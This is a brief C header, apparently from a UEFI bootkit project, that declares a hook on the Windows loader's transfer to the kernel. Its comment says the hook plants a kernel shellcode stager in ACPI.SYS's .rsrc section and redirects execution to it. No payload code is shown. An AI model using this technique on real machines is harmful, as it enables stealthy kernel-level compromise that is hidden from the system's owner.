#pragma once

/*!
 *
 * Purpose:
 *
 * Inserts a kernel shellcode stager into ACPI.SYS
 * .rsrc section, and directs execution to it.
 *
!*/
D_SEC( B ) VOID EFIAPI OslArchTransferToKernelHook( _In_ PVOID LoaderBlock, _In_ PVOID Entry );
